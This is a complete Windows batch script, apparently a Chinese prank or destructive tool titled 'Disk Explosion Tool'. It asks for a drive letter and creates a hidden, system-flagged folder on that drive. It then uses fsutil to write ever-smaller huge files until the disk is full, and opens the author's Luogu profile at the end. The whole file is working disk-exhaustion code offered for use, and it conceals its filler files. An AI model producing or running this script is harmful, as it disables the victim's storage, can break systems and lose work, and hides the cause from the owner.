@echo off
title 磁盘爆炸工具 By @PanDaoxi
set file=0
set big=100000000000000

:input
set /p Disk=请输入需要爆炸的磁盘盘符：
echo.
set %Disk%=%Disk:~0,1%
if not exist "%Disk%:\" (
echo 你的盘符不存在！请换一个。
goto input)
md "%Disk%:\PanDaoxiYYDS" > nul
attrib +s +h "%Disk%:\PanDaoxiYYDS"

:st
set /a file=%file%+1
echo %file%	填充中……大小 %big% Byte
fsutil file createnew "%Disk%:\PanDaoxiYYDS\%file%" %big% > nul
if not exist "%Disk%:\PanDaoxiYYDS\%file%" (goto smaller)
goto st

:smaller
if /i "%big%" == "1" goto exi
if /i "%big%" == "10" set big=1
if /i "%big%" == "100" set big=10
if /i "%big%" == "1000" set big=100
if /i "%big%" == "10000" set big=1000
if /i "%big%" == "100000" set big=10000
if /i "%big%" == "1000000" set big=100000
if /i "%big%" == "10000000" set big=1000000
if /i "%big%" == "100000000" set big=10000000
if /i "%big%" == "1000000000" set big=100000000
if /i "%big%" == "10000000000" set big=1000000000
if /i "%big%" == "100000000000" set big=10000000000
if /i "%big%" == "1000000000000" set big=100000000000
if /i "%big%" == "10000000000000" set big=1000000000000
if /i "%big%" == "100000000000000" set big=10000000000000
goto st

:exi
timeout 3
cls
echo 爆满成功！！
echo Copyright 2022 by @PanDaoxi. 求三连！
pause
start https://www.luogu.com.cn/user/593403